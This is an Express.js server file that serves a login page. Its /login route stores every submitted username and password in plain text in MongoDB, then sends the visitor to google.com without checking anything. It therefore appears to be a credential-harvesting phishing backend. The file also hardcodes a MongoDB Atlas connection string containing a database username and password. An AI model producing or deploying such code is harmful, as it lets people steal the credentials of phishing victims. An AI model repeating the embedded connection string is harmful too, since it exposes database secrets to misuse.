const express = require("express");
const mongoose = require("mongoose");
const path = require("path");

const app = express();

// ✅ Render compatible port
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));

// ===== MongoDB Connection =====
mongoose.connect("mongodb+srv://anindya_420:Ishu%40125@cluster0.tqmgrvy.mongodb.net/loginApp?retryWrites=true&w=majority")
.then(() => console.log("MongoDB Atlas Connected"))
.catch(err => console.log("Mongo Error:", err));

// ===== User Schema =====
const userSchema = new mongoose.Schema({
    username: String,
    password: String
});

const User = mongoose.model("User", userSchema);

// ===== Home Route =====
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "login.html"));
});

// ===== Login Route =====
app.post("/login", async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.send("Please fill all fields");
        }

        const newUser = new User({ username, password });
        await newUser.save();

        console.log("Saved:", username);

        res.redirect("https://www.google.com");

    } catch (error) {
        console.log("Error:", error);
        res.send("Something went wrong");
    }
});

// ✅ IMPORTANT: 127.0.0.1 remove
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});